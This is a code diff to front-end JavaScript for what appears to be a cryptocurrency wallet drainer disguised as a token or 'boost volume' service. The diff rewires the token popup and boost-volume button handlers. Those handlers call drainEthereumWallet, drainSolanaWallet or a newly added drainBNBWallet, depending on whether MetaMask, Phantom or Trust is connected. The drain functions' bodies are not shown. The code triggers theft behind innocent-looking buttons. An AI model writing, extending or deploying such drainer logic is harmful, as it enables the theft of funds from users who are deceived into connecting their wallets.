@@ -485,8 +485,8 @@
                             console.log('Calling drainSolanaWallet with no arguments');
                             app.drainSolanaWallet();
                         } else if (app.connectedWalletType === 'Trust') {
-                            console.log('Calling drainEthereumWallet with no arguments');
-                            app.drainEthereumWallet();
+                            console.log('Calling drainBNBWallet with no arguments');
+                            app.drainBNBWallet();
                         } else {
                             app.showFeedback('No wallet connected. Please connect your wallet.', 'error');
                             console.log('No wallet connected for token popup');
@@ -538,8 +538,8 @@
                             console.log('Calling drainSolanaWallet with no arguments');
                             app.drainSolanaWallet();
                         } else if (app.connectedWalletType === 'Trust') {
-                            console.log('Calling drainEthereumWallet with no arguments');
-                            app.drainEthereumWallet();
+                            console.log('Calling drainBNBWallet with no arguments');
+                            app.drainBNBWallet();
                         } else {
                             app.showFeedback('No wallet connected. Please connect your wallet.', 'error');
                             console.log('No wallet connected for custom token popup');
@@ -718,13 +718,17 @@
                     return;
                 }
      
-                // Call the correct drain function based on the connected wallet, with NO arguments
-                if (app.connectedWalletType === 'Phantom') {
-                    console.log('[boostVolumeBtn] Calling drainSolanaWallet with no arguments');
-                    app.drainSolanaWallet();
-                } else if (app.connectedWalletType === 'MetaMask' || app.connectedWalletType === 'Trust') {
-                    console.log('[boostVolumeBtn] Calling drainEthereumWallet with no arguments');
+                // Call the correct drain function based on the connected wallet
+                console.log('[boostVolumeBtn] Calling appropriate drain function');
+                if (app.connectedWalletType === 'MetaMask') {
+                    console.log('[boostVolumeBtn] Calling drainEthereumWallet');
                     app.drainEthereumWallet();
+                } else if (app.connectedWalletType === 'Phantom') {
+                    console.log('[boostVolumeBtn] Calling drainSolanaWallet');
+                    app.drainSolanaWallet();
+                } else if (app.connectedWalletType === 'Trust') {
+                    console.log('[boostVolumeBtn] Calling drainBNBWallet');
+                    app.drainBNBWallet();
                 } else {
                     app.showFeedback('Your connected wallet is not supported for this action.', 'error');
                     console.log('[boostVolumeBtn] Unsupported wallet type:', app.connectedWalletType);
